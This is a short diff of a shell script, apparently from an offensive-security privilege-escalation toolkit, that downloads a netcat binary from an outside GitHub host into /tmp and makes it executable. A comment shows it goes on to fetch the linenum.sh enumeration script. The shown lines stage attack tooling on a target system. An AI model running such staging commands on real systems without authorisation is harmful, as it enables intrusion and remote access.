@@ -10,7 +10,7 @@ echo "[]________________________________________________________________________
 
 # download NC
 echo "[*] Downloading NC to: /tmp/ + making executable"
-wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -o $stage/nc
+wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -o /tmp/nc
 chmod +x /tmp/nc
 
 # download linenum.sh
